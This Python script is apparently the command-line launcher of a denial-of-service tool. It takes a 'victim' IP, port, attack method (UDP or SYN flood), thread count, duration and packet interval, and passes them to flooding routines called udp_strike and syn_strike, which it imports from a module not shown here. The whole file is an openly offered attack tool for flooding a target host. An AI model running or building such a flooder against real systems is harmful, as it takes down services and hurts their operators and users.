import optparse, asyncio

from os import system
from sys import version,stdout
from socket import gethostbyaddr

from savitr.zeus import *

#sudo python3 main.py -v 127.0.0.1 -d 80 -m UDP -t 60 -p 3

usage = """\n\n

Example: -v 127.0.0.1 -d 80 -m udp -t 10 -p 6 -s .4  (Does not need to be in order)

Options: (everything but victim has a default value if not given one)
 ________________________________________________________________
|                                                                |
|-v, --victim      | The IP address.                             |
|-d, --destination | The targeted Port number.                   |
|-m, --method      | The attack Method.                          |
|-p, --processes   | The Thread count.                           |
|-t, --time        | The attack Time length in second(s).        |
|-s, --sleep       | The time between each packet in second(s).  |
|________________________________________________________________|
 """

parser = optparse.OptionParser(description="User options", usage=usage)
parser.add_option(

        '-v',
        '--victim',
        action='store',
        dest='harg',
        type=str,
        help='The host IP address.'
    )
parser.add_option(

        '-d',
        '--destination',
        action='store',
        dest='darg',
        type=int,
        default=80,
        help='The host Port number.'
    )
parser.add_option(

        '-m',
        '--method',
        action='store',
        dest='marg',
        type=str,
        default='udp',
        help='The attack Method.'
    )
parser.add_option(

        '-p',
        '--processes',
        action='store',
        dest='parg',
        type=int,
        default=3,
        help='The Thread count.'
    )
parser.add_option(

        '-t',
        '--time',
        action='store',
        dest='targ',
        type=int,
        default=5,
        help='The attack Time.'
    )

parser.add_option(

    '-s',
    '--sleep',
    action='store',
    dest='sarg',
    type=float,
    default=.4,
    help='time between each packet sent in second(s).'
)


try:
    (options, args) = parser.parse_args()
except optparse.OptParseError as e:

    stdout.write('\n[!!]\tUnable to parse arguments.')
    raise SystemExit

ARGS = {

    'victim/IP address': options.harg,
    'destination/Port': options.darg,
    'method/UDP,SYN': options.marg,
    'threads': options.parg, #  -p/--processes
    'time/Seconds': options.targ,
    'sleep': options.sarg
}

VERSION = {

    'required': [3,5,0,'3.5.0'],
    'user_version': version[0:6],
}


usr_opt = """\n\n

Victim  | {victim/IP address} // {}
_______________________________

Port    | {destination/Port}
_______________________________

Method  | {method/UDP,SYN}
_______________________________

Threads | {threads}
_______________________________

Time    | {time/Seconds}
_______________________________

Sleep   | {sleep}
""".format(gethostbyaddr(ARGS['victim/IP address']), **ARGS)





def check_compatibility(run):

    def version(*version):

            updated = {}

            for i in version: updated.update(i)
            assert updated['user_version'] >= updated['required'][3], "\n[!!]\tMust have at least Python version {required}. You have {user_version}".format(**updated)

            return run(**updated)

    return version


@check_compatibility
def main(required, user_version):

    stdout.write(usr_opt); input("\nPRESS ENTER TO CONTINUE. (Ctrl+z to exit)")

    if ARGS['method/UDP,SYN'] == 'udp'.casefold():

        loop = asyncio.get_event_loop()
        loop.run_until_complete(udp_strike(**ARGS)); assert loop
        loop.close()

    elif ARGS['method/UDP,SYN'] == 'syn'.casefold():

        loop = asyncio.get_event_loop()
        loop.run_until_complete(syn_strike(**ARGS)); assert loop
        loop.close()




if __name__ == '__main__':
    'execute'

    system("clear")
    main(VERSION)
